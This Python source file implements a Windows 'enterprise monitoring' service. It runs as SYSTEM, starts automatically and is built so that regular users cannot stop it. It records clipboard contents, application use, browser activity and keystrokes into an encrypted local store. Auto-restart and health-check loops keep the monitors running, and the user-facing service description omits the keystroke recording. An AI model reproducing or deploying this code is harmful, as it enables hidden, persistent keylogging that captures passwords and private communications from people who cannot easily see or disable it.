"""
Windows Service Implementation for Enterprise Monitoring Agent - FIXED VERSION

This module implements the core Windows service that runs continuously
with SYSTEM privileges and cannot be stopped by regular users.
"""

import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import sys
import logging
from pathlib import Path
import threading
import time
from datetime import datetime
import os
from keystroke_recorder import KeystrokeRecorder

# Fix Python path to find modules
current_dir = Path(__file__).parent
project_root = current_dir.parent.parent
sys.path.insert(0, str(project_root / "src"))
sys.path.insert(0, str(project_root / "src" / "enterprise"))

# Create .clipboard_monitor directory first (before logging setup)
config_dir = Path.home() / ".clipboard_monitor"
config_dir.mkdir(parents=True, exist_ok=True)

# Create ProgramData directory
program_data_dir = Path('C:/ProgramData/EnterpriseMonitoring')
if not program_data_dir.exists():
    try:
        os.makedirs(program_data_dir, exist_ok=True)
        os.makedirs(program_data_dir / 'logs', exist_ok=True)
        os.makedirs(program_data_dir / 'data', exist_ok=True)
        os.makedirs(program_data_dir / 'config', exist_ok=True)
    except Exception as e:
        print(f"Error creating directories: {e}")

# Configure logging for service

log_dir = Path('C:/ProgramData/EnterpriseMonitoring/logs')
log_dir.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_dir / 'service.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)


class MonitoringEngine:
    """Core monitoring engine that coordinates all monitoring components"""
    
    def __init__(self):
        self.is_running = False
        self.monitors = []
        
        # Import monitoring components
        from clipboard_monitor import ClipboardMonitor
        from app_usage_tracker import ApplicationUsageTracker
        from browser_tracker import BrowserActivityTracker
        from database_manager import DatabaseManager
        
        # Initialize database
        db_path = Path('C:/ProgramData/EnterpriseMonitoring/data/monitoring.db')
        db_path.parent.mkdir(parents=True, exist_ok=True)
        self.db = DatabaseManager(db_path, enable_encryption=True)
        
        # Initialize monitors
        self.clipboard_monitor = ClipboardMonitor(
            callback=self.on_clipboard_event,
            polling_interval=0.5
        )
        
        self.app_tracker = ApplicationUsageTracker(
            callback=self.on_app_usage_event
        )
        
        self.browser_tracker = BrowserActivityTracker(
            callback=self.on_browser_event
        )
        
        self.keystroke_recorder = KeystrokeRecorder(
        storage_dir=Path('C:/ProgramData/EnterpriseMonitoring/data/keystrokes'),
        callback=self.on_keystroke_event,
        enable_encryption=True,
        buffer_flush_interval=60
        )
        self.monitors = [
            self.clipboard_monitor,
            self.app_tracker,
            self.browser_tracker,
            self.keystroke_recorder
        ]
        
        logger.info("Monitoring engine initialized")
    
    def on_clipboard_event(self, event):
        """Handle clipboard events"""
        try:
            self.db.log_clipboard_event(event)
            logger.debug(f"Clipboard event logged: {event['event_type']}")
        except Exception as e:
            logger.error(f"Error logging clipboard event: {e}")
    
    def on_app_usage_event(self, event):
        """Handle application usage events"""
        try:
            self.db.log_app_usage(event)
            logger.debug(f"App usage logged: {event['process_name']}")
        except Exception as e:
            logger.error(f"Error logging app usage: {e}")
    
    def on_browser_event(self, event):
        """Handle browser activity events"""
        try:
            self.db.log_browser_activity(event)
            logger.debug(f"Browser activity logged: {event['browser_name']}")
        except Exception as e:
            logger.error(f"Error logging browser activity: {e}")

    def on_keystroke_event(self, event):
        try:
            # Just log to debug - don't store in main DB
            logger.debug(f"Keystroke recorded in {event['application']}")
        except Exception as e:
            logger.error(f"Error handling keystroke event: {e}")        
    
    def start_all_monitors(self):
        """Start all monitoring components"""
        logger.info("Starting all monitors...")
        self.is_running = True
    
    
        
        for monitor in self.monitors:
            try:
                monitor.start()
                logger.info(f"Started: {monitor.__class__.__name__}")
            except Exception as e:
                logger.error(f"Failed to start {monitor.__class__.__name__}: {e}")
        
        logger.info("All monitors started successfully")
    
    def stop_all_monitors(self):
        """Stop all monitoring components"""
        logger.info("Stopping all monitors...")
        self.is_running = False
        
        for monitor in self.monitors:
            try:
                monitor.stop()
                logger.info(f"Stopped: {monitor.__class__.__name__}")
            except Exception as e:
                logger.error(f"Error stopping {monitor.__class__.__name__}: {e}")
        
        logger.info("All monitors stopped")


class EnterpriseMonitoringService(win32serviceutil.ServiceFramework):
    """Windows Service for Enterprise Activity Monitoring"""
    
    _svc_name_ = "EnterpriseMonitoringAgent"
    _svc_display_name_ = "Enterprise Activity Monitoring Service"
    _svc_description_ = (
        "Monitors user activity including clipboard operations, "
        "application usage, and browser activity for compliance and productivity tracking"
    )
    
    # Service configuration
    _svc_deps_ = []  # No dependencies
    _svc_startup_type_ = win32service.SERVICE_AUTO_START
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        self.engine = None
        
        # Health check thread
        self.health_check_thread = None
        
        logger.info("Service initialized")
    
    def SvcStop(self):
        """Called when the service is requested to stop"""
        logger.info("Service stop requested")
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        self.running = False
    
    def SvcDoRun(self):
        """Main service entry point"""
        logger.info("Service starting...")
        
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        
        try:
            self.main()
        except Exception as e:
            logger.critical(f"Service crashed: {e}", exc_info=True)
            servicemanager.LogErrorMsg(f"Service error: {e}")
    
    def main(self):
        """Main service logic"""
        logger.info("Initializing monitoring engine...")
        
        try:
            # Initialize monitoring engine
            self.engine = MonitoringEngine()
            
            # Start all monitors
            self.engine.start_all_monitors()
            
            # Start health check
            self.start_health_check()
            
            logger.info("Service running - monitoring active")
            
            # Keep service running
            while self.running:
                # Wait for stop event (check every 5 seconds)
                rc = win32event.WaitForSingleObject(self.stop_event, 5000)
                if rc == win32event.WAIT_OBJECT_0:
                    # Stop event signaled
                    break
            
            # Cleanup
            logger.info("Service stopping - cleaning up...")
            self.engine.stop_all_monitors()
            
            servicemanager.LogMsg(
                servicemanager.EVENTLOG_INFORMATION_TYPE,
                servicemanager.PYS_SERVICE_STOPPED,
                (self._svc_name_, '')
            )
            
        except Exception as e:
            logger.critical(f"Critical error in main loop: {e}", exc_info=True)
            raise
    
    def start_health_check(self):
        """Start health monitoring thread"""
        def health_check_loop():
            logger.info("Health check thread started")
            while self.running:
                try:
                    # Check if monitors are still running
                    if self.engine:
                        for monitor in self.engine.monitors:
                            if hasattr(monitor, 'is_monitoring'):
                                if not monitor.is_monitoring():
                                    logger.warning(f"Monitor {monitor.__class__.__name__} stopped unexpectedly - restarting")
                                    monitor.start()
                    
                    # Sleep for 30 seconds between checks
                    time.sleep(30)
                    
                except Exception as e:
                    logger.error(f"Health check error: {e}")
                    time.sleep(60)
            
            logger.info("Health check thread stopped")
        
        self.health_check_thread = threading.Thread(
            target=health_check_loop,
            daemon=True
        )
        self.health_check_thread.start()


def install_service():
    """Install the Windows service"""
    try:
        logger.info("Installing service...")
        
        # Install service
        win32serviceutil.HandleCommandLine(
            EnterpriseMonitoringService,
            argv=['', 'install']
        )
        
        # Configure service recovery (auto-restart on failure)
        configure_service_recovery()
        
        logger.info("Service installed successfully")
        print("Service installed successfully!")
        print(f"Service Name: {EnterpriseMonitoringService._svc_name_}")
        print("Use 'net start EnterpriseMonitoringAgent' to start the service")
        
        return True
        
    except Exception as e:
        logger.error(f"Service installation failed: {e}")
        print(f"ERROR: Service installation failed - {e}")
        return False


def configure_service_recovery():
    """Configure service to auto-restart on failure"""
    import subprocess
    
    service_name = EnterpriseMonitoringService._svc_name_
    
    logger.info("Configuring service recovery options...")
    
    try:
        # Configure failure actions
        cmd = [
            'sc', 'failure', service_name,
            'reset=', '86400',
            'actions=', 'restart/60000/restart/120000/restart/300000'
        ]
        
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        logger.info("Service recovery configured successfully")
        
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to configure service recovery: {e}")


def start_service():
    """Start the service"""
    try:
        logger.info("Starting service...")
        win32serviceutil.StartService(EnterpriseMonitoringService._svc_name_)
        logger.info("Service started successfully")
        print("Service started successfully!")
        return True
    except Exception as e:
        logger.error(f"Failed to start service: {e}")
        print(f"ERROR: Failed to start service - {e}")
        return False


def stop_service():
    """Stop the service"""
    try:
        logger.info("Stopping service...")
        
        # Check if service is running before attempting to stop
        try:
            status = win32serviceutil.QueryServiceStatus(EnterpriseMonitoringService._svc_name_)
            service_status = status[1]  # Status code is at index 1
            
            # 1 = STOPPED, 4 = RUNNING
            if service_status == 1:
                logger.info("Service is already stopped")
                print("Service is already stopped")
                return True
        except Exception as e:
            logger.warning(f"Could not query service status: {e}")
        
        win32serviceutil.StopService(EnterpriseMonitoringService._svc_name_)
        logger.info("Service stopped successfully")
        print("Service stopped successfully!")
        return True
    except Exception as e:
        # Check if error is "service not started" - this is not really an error
        error_msg = str(e)
        if "1062" in error_msg or "not been started" in error_msg.lower():
            logger.info("Service was not running")
            print("Service is not running")
            return True
        
        logger.error(f"Failed to stop service: {e}")
        print(f"ERROR: Failed to stop service - {e}")
        return False


def remove_service():
    """Remove the service"""
    try:
        logger.info("Removing service...")
        
        # Stop service first if it's running
        logger.info("Checking if service needs to be stopped...")
        stop_service()
            
        # Remove service
        print(f"Removing service {EnterpriseMonitoringService._svc_name_}")
        win32serviceutil.HandleCommandLine(
            EnterpriseMonitoringService,
            argv=['', 'remove']
        )
        
        logger.info("Service removed successfully")
        print("\n✓ Service removed successfully!")
        return True
        
    except Exception as e:
        logger.error(f"Failed to remove service: {e}")
        print(f"\n✗ ERROR: Failed to remove service - {e}")
        return False


if __name__ == '__main__':
    """Main entry point for service control"""
    
    if len(sys.argv) == 1:
        # No arguments - run as service
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(EnterpriseMonitoringService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        # Command-line arguments provided
        command = sys.argv[1].lower()
        
        if command == 'install':
            install_service()
        elif command == 'start':
            start_service()
        elif command == 'stop':
            stop_service()
        elif command == 'remove' or command == 'uninstall':
            remove_service()
        elif command == 'restart':
            stop_service()
            time.sleep(2)
            start_service()
        elif command == 'debug':
            # Run in debug mode
            print("Running service in debug mode...")
            print("Press Ctrl+C to stop")
            try:
                engine = MonitoringEngine()
                engine.start_all_monitors()
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nStopping...")
                engine.stop_all_monitors()
        else:
            # Use default handler for standard service commands
            win32serviceutil.HandleCommandLine(EnterpriseMonitoringService)